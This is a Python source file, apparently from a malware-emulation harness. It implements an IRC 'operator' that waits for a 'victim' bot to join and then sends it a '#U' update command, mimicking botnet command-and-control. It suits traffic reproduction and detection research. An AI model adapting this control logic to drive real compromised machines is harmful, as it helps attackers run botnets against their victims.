import socket
import threading
import time
from typing import Callable, Optional

from config import EmulationConfig
from protocol import recv_line, send_line


class IrcOperator(threading.Thread):
    def __init__(
        self,
        config: EmulationConfig,
        victim_registered: threading.Event,
        stop_event: threading.Event,
        trace: Optional[Callable[[str], None]] = None,
    ) -> None:
        super().__init__(name="irc-operator", daemon=True)
        self.config = config
        self.victim_registered = victim_registered
        self.stop_event = stop_event
        self.trace = trace or print
        self.ready = threading.Event()
        self.done = threading.Event()
        self.error: Optional[BaseException] = None
        self.ack_line: Optional[str] = None

    def run(self) -> None:
        try:
            with socket.create_connection(
                (self.config.irc_connect_host, self.config.irc_port),
                timeout=self.config.socket_timeout,
            ) as sock:
                sock.settimeout(self.config.socket_timeout)
                send_line(sock, f"NICK {self.config.operator_nick}", lambda line: self.trace(f"[O -> IRC-S] {line}"))
                send_line(
                    sock,
                    f"USER {self.config.operator_nick} 8 * : IRC Client",
                    lambda line: self.trace(f"[O -> IRC-S] {line}"),
                )
                self._wait_for_004(sock)
                self.ready.set()

                if not self.victim_registered.wait(self.config.socket_timeout):
                    raise TimeoutError("Victim did not register in IRC")
                time.sleep(0.2)

                command = f"PRIVMSG {self.config.victim_nick} :#U{self.config.update_name}"
                send_line(sock, command, lambda line: self.trace(f"[O -> IRC-S] {line}"))

                while not self.stop_event.is_set():
                    line = recv_line(sock)
                    if not line:
                        return
                    self.trace(f"[IRC-S -> O] {line}")
                    expected = f"PRIVMSG {self.config.operator_nick} :{self.config.package_name} updated"
                    if expected in line:
                        self.ack_line = line
                        self.done.set()
                        return
        except BaseException as exc:
            self.error = exc
            self.ready.set()
            self.done.set()

    def _wait_for_004(self, sock: socket.socket) -> None:
        while not self.stop_event.is_set():
            line = recv_line(sock)
            if not line:
                raise ConnectionError("IRC server closed operator registration")
            self.trace(f"[IRC-S -> O] {line}")
            if " 004 " in line or line.startswith(":irc.freenode.net 004 "):
                return
